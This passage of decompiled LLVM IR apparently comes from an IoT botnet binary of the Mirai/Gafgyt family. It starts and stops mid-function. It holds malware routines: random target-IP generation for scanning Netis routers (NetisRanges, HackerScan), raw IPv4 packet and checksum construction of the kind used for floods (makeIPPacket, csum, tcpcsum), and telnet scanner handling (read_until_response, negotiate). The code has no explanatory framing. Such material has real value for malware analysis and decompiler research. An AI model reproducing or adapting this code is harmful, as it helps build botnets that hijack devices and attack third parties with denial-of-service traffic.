  uselistorder label %dec_label_pc_bc84, { 1, 0 }
  uselistorder label %dec_label_pc_bc50, { 1, 0 }
  uselistorder label %dec_label_pc_bc1c, { 1, 0 }
  uselistorder label %dec_label_pc_bbe8, { 1, 0 }
  uselistorder label %dec_label_pc_bbb4, { 1, 0 }
  uselistorder label %dec_label_pc_bb80, { 1, 0 }
  uselistorder label %dec_label_pc_bb4c, { 1, 0 }
  uselistorder label %dec_label_pc_bb18, { 1, 0 }
  uselistorder label %dec_label_pc_bae4, { 1, 0 }
  uselistorder label %dec_label_pc_bab0, { 1, 0 }
  uselistorder label %dec_label_pc_ba7c, { 1, 0 }
  uselistorder label %dec_label_pc_ba48, { 1, 0 }
  uselistorder label %dec_label_pc_ba14, { 1, 0 }
  uselistorder label %dec_label_pc_b9e0, { 1, 0 }
  uselistorder label %dec_label_pc_b9ac, { 1, 0 }
  uselistorder label %dec_label_pc_b978, { 1, 0 }
  uselistorder label %dec_label_pc_b944, { 1, 0 }
  uselistorder label %dec_label_pc_b6c0, { 1, 0 }
  uselistorder label %dec_label_pc_b68c, { 1, 0 }
  uselistorder label %dec_label_pc_b658, { 1, 0 }
  uselistorder label %dec_label_pc_b624, { 1, 0 }
  uselistorder label %dec_label_pc_b5f0, { 1, 0 }
  uselistorder label %dec_label_pc_b5bc, { 1, 0 }
  uselistorder label %dec_label_pc_b588, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
  uselistorder label %dec_label_pc_b520, { 1, 0 }
  uselistorder label %dec_label_pc_b4ec, { 1, 0 }
  uselistorder label %dec_label_pc_b4b8, { 1, 0 }
  uselistorder label %dec_label_pc_b484, { 1, 0 }
  uselistorder label %dec_label_pc_b450, { 1, 0 }
  uselistorder label %dec_label_pc_b41c, { 1, 0 }
  uselistorder label %dec_label_pc_b3e8, { 1, 0 }
  uselistorder label %dec_label_pc_b3b4, { 1, 0 }
  uselistorder label %dec_label_pc_b380, { 1, 0 }
  uselistorder label %dec_label_pc_b34c, { 1, 0 }
  uselistorder label %dec_label_pc_b318, { 1, 0 }
  uselistorder label %dec_label_pc_b2e4, { 1, 0 }
  uselistorder label %dec_label_pc_b2b0, { 1, 0 }
  uselistorder label %dec_label_pc_b27c, { 1, 0 }
  uselistorder label %dec_label_pc_b248, { 1, 0 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
  uselistorder label %dec_label_pc_b1e0, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b178, { 1, 0 }
  uselistorder label %dec_label_pc_b144, { 1, 0 }
  uselistorder label %dec_label_pc_b110, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0a8, { 1, 0 }
  uselistorder label %dec_label_pc_b074, { 1, 0 }
  uselistorder label %dec_label_pc_b040, { 1, 0 }
  uselistorder label %dec_label_pc_b00c, { 1, 0 }
  uselistorder label %dec_label_pc_afd8, { 1, 0 }
  uselistorder label %dec_label_pc_afa4, { 1, 0 }
  uselistorder label %dec_label_pc_af70, { 1, 0 }
  uselistorder label %dec_label_pc_af3c, { 1, 0 }
  uselistorder label %dec_label_pc_af08, { 1, 0 }
  uselistorder label %dec_label_pc_aed4, { 1, 0 }
  uselistorder label %dec_label_pc_aea0, { 1, 0 }
  uselistorder label %dec_label_pc_ae6c, { 1, 0 }
  uselistorder label %dec_label_pc_ae38, { 1, 0 }
  uselistorder label %dec_label_pc_ae04, { 1, 0 }
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %dec_label_pc_ad9c, { 1, 0 }
  uselistorder label %dec_label_pc_ad68, { 1, 0 }
  uselistorder label %dec_label_pc_ad34, { 1, 0 }
  uselistorder label %dec_label_pc_ad00, { 1, 0 }
  uselistorder label %dec_label_pc_accc, { 1, 0 }
  uselistorder label %dec_label_pc_ac98, { 1, 0 }
  uselistorder label %dec_label_pc_ac64, { 1, 0 }
  uselistorder label %dec_label_pc_ac30, { 1, 0 }
  uselistorder label %dec_label_pc_abfc, { 1, 0 }
  uselistorder label %dec_label_pc_abc8, { 1, 0 }
  uselistorder label %dec_label_pc_ab94, { 1, 0 }
  uselistorder label %dec_label_pc_ab60, { 1, 0 }
  uselistorder label %dec_label_pc_ab2c, { 1, 0 }
  uselistorder label %dec_label_pc_aaf8, { 1, 0 }
  uselistorder label %dec_label_pc_aac4, { 1, 0 }
  uselistorder label %dec_label_pc_aa90, { 1, 0 }
  uselistorder label %dec_label_pc_aa5c, { 1, 0 }
  uselistorder label %dec_label_pc_aa28, { 1, 0 }
  uselistorder label %dec_label_pc_a9f4, { 1, 0 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
  uselistorder label %dec_label_pc_a98c, { 1, 0 }
  uselistorder label %dec_label_pc_a958, { 1, 0 }
  uselistorder label %dec_label_pc_a924, { 1, 0 }
  uselistorder label %dec_label_pc_a8f0, { 1, 0 }
  uselistorder label %dec_label_pc_a8bc, { 1, 0 }
  uselistorder label %dec_label_pc_a888, { 1, 0 }
  uselistorder label %dec_label_pc_a854, { 1, 0 }
  uselistorder label %dec_label_pc_a820, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_d5b0 = load i32, i32* @r4, align 4
  %v6_d5b0 = load i32, i32* @fp, align 4
  store i32 54712, i32* %stack_var_-4, align 4
  %v2_d5b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d5b4, i32* @fp, align 4
  %v0_d5bc = call i32 @random()
  %v2_d5cc = urem i32 %v0_d5bc, 30
  %v4_d5e0 = mul nuw nsw i32 %v2_d5cc, 4
  %v5_d5e0 = add i32 %v4_d5e0, ptrtoint (i32* @global_var_2e168.474 to i32)
  %v6_d5e0 = inttoptr i32 %v5_d5e0 to i32*
  %v7_d5e0 = load i32, i32* %v6_d5e0, align 4
  %v1_d5ec = trunc i32 %v7_d5e0 to i8
  store i8 %v1_d5ec, i8* @global_var_2e46f.69, align 1
  %v0_d5f0 = call i32 @random()
  %v2_d600 = srem i32 %v0_d5f0, 255
  %v1_d610 = trunc i32 %v2_d600 to i8
  store i8 %v1_d610, i8* @global_var_2e470.70, align 1
  %v0_d614 = call i32 @random()
  %v2_d624 = srem i32 %v0_d614, 255
  %v1_d634 = trunc i32 %v2_d624 to i8
  store i8 %v1_d634, i8* @global_var_2e471.71, align 1
  %v0_d638 = call i32 @random()
  %v2_d648 = srem i32 %v0_d638, 255
  %v1_d658 = trunc i32 %v2_d648 to i8
  store i8 %v1_d658, i8* @global_var_2e472.72, align 1
  %v2_d65c = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  %v2_d698 = load i8, i8* bitcast (i8** @global_var_2e46e.68 to i8*), align 4
  %v3_d698 = zext i8 %v2_d698 to i32
  store i32 %v3_d698, i32* @lr, align 4
  %v3_d6a4 = load i8, i8* @global_var_2e46f.69, align 1
  %v4_d6a4 = zext i8 %v3_d6a4 to i32
  store i32 %v4_d6a4, i32* @r4, align 4
  %v3_d6b0 = load i8, i8* @global_var_2e470.70, align 1
  %v6_d6d8 = sext i8 %v3_d6a4 to i32
  %v8_d6d8 = sext i8 %v3_d6b0 to i32
  %v9_d6d8 = call i32 @szprintf(i32 %v2_d65c, i32 ptrtoint ([12 x i8]* @global_var_20554.477 to i32), i32 %v3_d698, i32 %v6_d6d8, i32 %v8_d6d8)
  store i32 %v2_d65c, i32* @r0, align 4
  %v1_d6e4 = call i32 @inet_addr(i32 %v2_d65c)
  store i32 %v3_d5b0, i32* @r4, align 4
  store i32 %v6_d5b0, i32* @fp, align 4
  ret i32 %v1_d6e4

; uselistorder directives
  uselistorder i32 %v2_d65c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_2e472.72, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2e471.71, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2e470.70, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_2e46f.69, { 3, 2, 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_d71c = load i32, i32* @global_var_346b4.479, align 4
  store i32 %v2_d71c, i32* @r0, align 4
  %v1_d724 = call i32 @__GI_ntohl(i32 %v2_d71c)
  %v2_d730 = and i32 %v1_d724, %arg1
  %v0_d738 = call i32 @rand_cmwc()
  %v1_d744 = sub i32 -1, %arg1
  %v2_d748 = and i32 %v0_d738, %v1_d744
  %v2_d750 = xor i32 %v2_d748, %v2_d730
  ret i32 %v2_d750

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_d7e09 = icmp sgt i32 %arg2, 1
  br i1 %v8_d7e09, label %dec_label_pc_d790, label %dec_label_pc_d7e4

dec_label_pc_d790:                                ; preds = %entry, %dec_label_pc_d790
  %v2_d7ac = phi i32 [ %v2_d7b0, %dec_label_pc_d790 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_d7b4, %dec_label_pc_d790 ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_d7d0, %dec_label_pc_d790 ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_d7c8, %dec_label_pc_d790 ], [ %arg1, %entry ]
  %v4_d790 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_d794 = load i8, i8* %stack_var_-32.010, align 1
  %v3_d794 = zext i8 %v2_d794 to i32
  %v1_d798 = add i32 %v4_d790, 1
  %v2_d798 = inttoptr i32 %v1_d798 to i8*
  %v3_d798 = load i8, i8* %v2_d798, align 1
  %v4_d798 = zext i8 %v3_d798 to i32
  %v4_d79c = mul nuw nsw i32 %v4_d798, 256
  %v5_d79c = or i32 %v4_d79c, %v3_d794
  %v2_d7b0 = add i32 %v5_d79c, %v2_d7ac
  %v3_d7b0 = icmp ult i32 %v2_d7b0, %v2_d7ac
  %v4_d7b4 = zext i1 %v3_d7b0 to i32
  %v5_d7b4 = add i32 %v4_d7b4, %stack_var_-40.012
  %v1_d7c4 = add i32 %v4_d790, 2
  %v5_d7c8 = inttoptr i32 %v1_d7c4 to i8*
  %v1_d7d0 = add nsw i32 %stack_var_-36.011, -2
  %v8_d7e0 = icmp sgt i32 %v1_d7d0, 1
  br i1 %v8_d7e0, label %dec_label_pc_d790, label %dec_label_pc_d7e4

dec_label_pc_d7e4:                                ; preds = %dec_label_pc_d790, %entry
  %v2_d804 = phi i32 [ 0, %entry ], [ %v2_d7b0, %dec_label_pc_d790 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_d7c8, %dec_label_pc_d790 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_d7b4, %dec_label_pc_d790 ]
  %v7_d7dc.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_d7d0, %dec_label_pc_d790 ]
  %v7_d7dc.lcssa = icmp eq i32 %v7_d7dc.lcssa.in, 1
  br i1 %v7_d7dc.lcssa, label %dec_label_pc_d7f0, label %dec_label_pc_d86c.preheader

dec_label_pc_d7f0:                                ; preds = %dec_label_pc_d7e4
  %v2_d7f4 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_d7f4 = zext i8 %v2_d7f4 to i32
  %v2_d808 = add i32 %v3_d7f4, %v2_d804
  %v3_d808 = icmp ult i32 %v2_d808, %v2_d804
  %v4_d80c = zext i1 %v3_d808 to i32
  %v5_d80c = add i32 %v4_d80c, %stack_var_-40.0.lcssa
  br label %dec_label_pc_d86c.preheader

dec_label_pc_d86c.preheader:                      ; preds = %dec_label_pc_d7f0, %dec_label_pc_d7e4
  %v3_d898.ph = phi i32 [ %v2_d804, %dec_label_pc_d7e4 ], [ %v2_d808, %dec_label_pc_d7f0 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_d7e4 ], [ %v5_d80c, %dec_label_pc_d7f0 ]
  %v3_d87036 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_d87837 = udiv i32 %v3_d898.ph, 65536
  %v2_d87c38 = or i32 %v3_d87036, %v3_d87837
  %v3_d88439 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_d88c40 = or i32 %v2_d87c38, %v3_d88439
  %v2_d89041 = icmp eq i32 %v2_d88c40, 0
  br i1 %v2_d89041, label %dec_label_pc_d898, label %dec_label_pc_d81c

dec_label_pc_d81c:                                ; preds = %dec_label_pc_d86c.preheader, %dec_label_pc_d81c
  %v3_d88444 = phi i32 [ %v3_d884, %dec_label_pc_d81c ], [ %v3_d88439, %dec_label_pc_d86c.preheader ]
  %v2_d87c43 = phi i32 [ %v2_d87c, %dec_label_pc_d81c ], [ %v2_d87c38, %dec_label_pc_d86c.preheader ]
  %v3_d89842 = phi i32 [ %v2_d85c, %dec_label_pc_d81c ], [ %v3_d898.ph, %dec_label_pc_d86c.preheader ]
  %v2_d830 = urem i32 %v3_d89842, 65536
  %v2_d85c = add i32 %v2_d87c43, %v2_d830
  %v3_d85c = icmp ult i32 %v2_d85c, %v2_d830
  %v4_d860 = zext i1 %v3_d85c to i32
  %v5_d860 = add nuw nsw i32 %v4_d860, %v3_d88444
  %v3_d870 = mul i32 %v5_d860, 65536
  %v3_d878 = udiv i32 %v2_d85c, 65536
  %v2_d87c = or i32 %v3_d870, %v3_d878
  %v3_d884 = udiv i32 %v5_d860, 65536
  %v2_d88c = or i32 %v2_d87c, %v3_d884
  %v2_d890 = icmp eq i32 %v2_d88c, 0
  br i1 %v2_d890, label %dec_label_pc_d86c.dec_label_pc_d898_crit_edge, label %dec_label_pc_d81c

dec_label_pc_d86c.dec_label_pc_d898_crit_edge:    ; preds = %dec_label_pc_d81c
  br label %dec_label_pc_d898

dec_label_pc_d898:                                ; preds = %dec_label_pc_d86c.dec_label_pc_d898_crit_edge, %dec_label_pc_d86c.preheader
  %v3_d898.lcssa = phi i32 [ %v2_d85c, %dec_label_pc_d86c.dec_label_pc_d898_crit_edge ], [ %v3_d898.ph, %dec_label_pc_d86c.preheader ]
  %v1_d8a4 = urem i32 %v3_d898.lcssa, 65536
  %v3_d8ac = xor i32 %v1_d8a4, 65535
  ret i32 %v3_d8ac

; uselistorder directives
  uselistorder i32 %v2_d87c, { 1, 0 }
  uselistorder i32 %v5_d860, { 1, 0 }
  uselistorder i32 %v2_d85c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_d88439, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_d898.ph, { 2, 1, 0 }
  uselistorder i32 %v2_d804, { 0, 2, 1 }
  uselistorder i32 %v1_d7d0, { 0, 2, 1 }
  uselistorder i32 %v2_d7b0, { 0, 2, 1 }
  uselistorder i32 %v2_d7ac, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d81c, { 1, 0 }
  uselistorder label %dec_label_pc_d790, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_d8c0 = load i32, i32* @fp, align 4
  store i32 55496, i32* %stack_var_-4, align 4
  %v2_d8c4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d8c4, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_d8f8 = add i32 %arg1, 12
  %v2_d8f8 = inttoptr i32 %v1_d8f8 to i32*
  %v3_d8f8 = load i32, i32* %v2_d8f8, align 4
  store i32 %v3_d8f8, i32* %stack_var_-44, align 4
  %v1_d920 = call i32 @__GI_htons(i32 20)
  %v1_d944 = call i32 @malloc(i32 32)
  %v2_d950 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_d944, i32* @r0, align 4
  store i32 %v2_d950, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_d960 = call i32 @memcpy()
  %v1_d968 = add i32 %v1_d944, 12
  store i32 %v1_d968, i32* @r0, align 4
  %v3_d970 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_d970, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_d978 = call i32 @memcpy()
  %v2_d984 = inttoptr i32 %v1_d944 to i8*
  %v3_d984 = call i32 @csum(i8* %v2_d984, i32 32)
  %sext2 = mul i32 %v3_d984, 16777216
  %v3_d990 = ashr i32 %sext2, 31
  store i32 %v1_d944, i32* @r0, align 4
  %v0_d99c = call i32 @free()
  %v3_d9a4 = sdiv i32 %sext2, 16777216
  %v4_d9a8 = mul nsw i32 %v3_d990, 256
  %v4_d9ac = and i32 %v4_d9a8, 65280
  %v5_d9ac = or i32 %v4_d9ac, %v3_d9a4
  store i32 %v3_d8c0, i32* @fp, align 4
  ret i32 %v5_d9ac

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_d944, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_d9c0 = load i32, i32* @fp, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v2_d9e0 = load i8, i8* %arg1, align 1
  %v4_d9e8 = zext i8 %v2_d9e0 to i32
  %v1_d9ec = and i32 %v4_d9e8, 240
  %v1_d9f0 = or i32 %v1_d9ec, 5
  store i32 %v1_d9f0, i32* %r3.global-to-local, align 4
  %v1_d9fc = trunc i32 %v1_d9f0 to i8
  store i8 %v1_d9fc, i8* %arg1, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_da2c = add i32 %tmp4, 1
  %v4_da2c = inttoptr i32 %v3_da2c to i8*
  store i8 0, i8* %v4_da2c, align 1
  %v3_da30 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_da30, 20
  %v3_da44 = urem i32 %fold, 65536
  store i32 %v3_da44, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_da4c = trunc i32 %fold to i8
  %v3_da4c = add i32 %tmp4, 2
  %v4_da4c = inttoptr i32 %v3_da4c to i8*
  store i8 %v1_da4c, i8* %v4_da4c, align 1
  %v0_da50 = load i32, i32* %r3.global-to-local, align 4
  %v3_da50 = sdiv i32 %v0_da50, 256
  store i32 %v3_da50, i32* %r3.global-to-local, align 4
  %v1_da54 = trunc i32 %v3_da50 to i8
  %v2_da54 = load i32, i32* %r2.global-to-local, align 4
  %v3_da54 = add i32 %v2_da54, 3
  %v4_da54 = inttoptr i32 %v3_da54 to i8*
  store i8 %v1_da54, i8* %v4_da54, align 1
  %v0_da58 = call i32 @rand_cmwc()
  %v3_da64 = urem i32 %v0_da58, 65536
  store i32 %v3_da64, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_da6c = trunc i32 %v0_da58 to i8
  %v3_da6c = add i32 %tmp4, 4
  %v4_da6c = inttoptr i32 %v3_da6c to i8*
  store i8 %v1_da6c, i8* %v4_da6c, align 1
  %v0_da70 = load i32, i32* %r3.global-to-local, align 4
  %v3_da703 = udiv i32 %v0_da70, 256
  %v1_da74 = trunc i32 %v3_da703 to i8
  %v2_da74 = load i32, i32* %r2.global-to-local, align 4
  %v3_da74 = add i32 %v2_da74, 5
  %v4_da74 = inttoptr i32 %v3_da74 to i8*
  store i8 %v1_da74, i8* %v4_da74, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_da80 = add i32 %tmp4, 6
  %v4_da80 = inttoptr i32 %v3_da80 to i8*
  store i8 0, i8* %v4_da80, align 1
  %v0_da84 = load i32, i32* %r3.global-to-local, align 4
  %v1_da84 = trunc i32 %v0_da84 to i8
  %v2_da84 = load i32, i32* %r2.global-to-local, align 4
  %v3_da84 = add i32 %v2_da84, 7
  %v4_da84 = inttoptr i32 %v3_da84 to i8*
  store i8 %v1_da84, i8* %v4_da84, align 1
  %v3_da90 = add i32 %tmp4, 8
  %v4_da90 = inttoptr i32 %v3_da90 to i8*
  store i8 -1, i8* %v4_da90, align 1
  %v3_da9c = add i32 %tmp4, 9
  %v4_da9c = inttoptr i32 %v3_da9c to i8*
  store i8 %tmp, i8* %v4_da9c, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_daa8 = add i32 %tmp4, 10
  %v4_daa8 = inttoptr i32 %v3_daa8 to i8*
  store i8 0, i8* %v4_daa8, align 1
  %v0_daac = load i32, i32* %r3.global-to-local, align 4
  %v1_daac = trunc i32 %v0_daac to i8
  %v2_daac = load i32, i32* %r2.global-to-local, align 4
  %v3_daac = add i32 %v2_daac, 11
  %v4_daac = inttoptr i32 %v3_daac to i8*
  store i8 %v1_daac, i8* %v4_daac, align 1
  %v2_dab8 = add i32 %tmp4, 12
  %v3_dab8 = inttoptr i32 %v2_dab8 to i32*
  store i32 %arg3, i32* %v3_dab8, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_dac4 = add i32 %tmp4, 16
  %v3_dac4 = inttoptr i32 %v2_dac4 to i32*
  store i32 %arg2, i32* %v3_dac4, align 4
  store i32 %v3_d9c0, i32* @fp, align 4
  ret i32 %v0_da58

; uselistorder directives
  uselistorder i32 %v0_da58, { 1, 2, 0 }
  uselistorder i32 %v3_da50, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v8_daec = icmp sgt i32 %arg1, 2
  br i1 %v8_daec, label %dec_label_pc_dafc, label %dec_label_pc_db0c

dec_label_pc_dafc:                                ; preds = %entry
  %v1_db00 = call i32 @__GI_close(i32 %arg1)
  br label %dec_label_pc_db0c

dec_label_pc_db0c:                                ; preds = %entry, %dec_label_pc_dafc
  %storemerge1 = phi i32 [ 0, %dec_label_pc_dafc ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_db0c, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_db20 = load i32, i32* @fp, align 4
  %v1_db34 = add i32 %arg1, 4
  %v2_db34 = inttoptr i32 %v1_db34 to i32*
  %v3_db34 = load i32, i32* %v2_db34, align 4
  store i32 %v3_db34, i32* @r0, align 4
  %v1_db40 = call i32 @__GI_inet_ntoa(i32 %v3_db34)
  store i32 %v3_db20, i32* @fp, align 4
  ret i32 %v1_db40
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_db58 = load i32, i32* @fp, align 4
  store i32 56160, i32* %stack_var_-4, align 4
  %v2_db5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_db5c, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_db84 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_db98 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_dba8 = load i8, i8* %arg3, align 1
  %v2_dbac = icmp eq i8 %v2_dba8, -1
  br i1 %v2_dbac, label %dec_label_pc_dbb4, label %dec_label_pc_dbc8

dec_label_pc_dbb4:                                ; preds = %entry
  %v4_dbc4 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3)
  br label %dec_label_pc_dbc8

dec_label_pc_dbc8:                                ; preds = %entry, %dec_label_pc_dbb4
  %v3_dbcc = load i32, i32* %stack_var_0, align 4
  %v3_dbd0 = call i32 @contains_string(i32 %tmp, i32 %v3_dbcc)
  %v2_dbd8 = icmp ne i32 %v3_dbd0, 0
  %. = zext i1 %v2_dbd8 to i32
  store i32 %v3_db58, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_dbc8, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dc48.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_dc08 = load i32, i32* @fp, align 4
  store i32 %v3_dc08, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_dc34 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_dc48

dec_label_pc_dc48:                                ; preds = %dec_label_pc_dc48.lr.ph, %dec_label_pc_dc48
  %storemerge25 = phi i32 [ 0, %dec_label_pc_dc48.lr.ph ], [ %v1_dc5c, %dec_label_pc_dc48 ]
  %v5_dc54 = mul nuw nsw i32 %storemerge25, 4
  %v6_dc54 = add i32 %v5_dc54, %v2_dc34
  %v7_dc54 = inttoptr i32 %v6_dc54 to i32*
  store i32 0, i32* %v7_dc54, align 4
  %v1_dc5c = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_dc5c, 32
  br i1 %tmp21, label %dec_label_pc_dc48, label %dec_label_pc_dc70

dec_label_pc_dc70:                                ; preds = %dec_label_pc_dc48
  %v13_dc08 = ptrtoint i32* %stack_var_-16 to i32
  %v3_dc74 = udiv i32 %arg1, 32
  %v3_dc80 = mul nuw nsw i32 %v3_dc74, 4
  %v2_dc88 = add nsw i32 %v3_dc80, -136
  %v2_dc8c = add i32 %v2_dc88, %v13_dc08
  %v1_dc90 = inttoptr i32 %v2_dc8c to i32*
  %v2_dc90 = load i32, i32* %v1_dc90, align 4
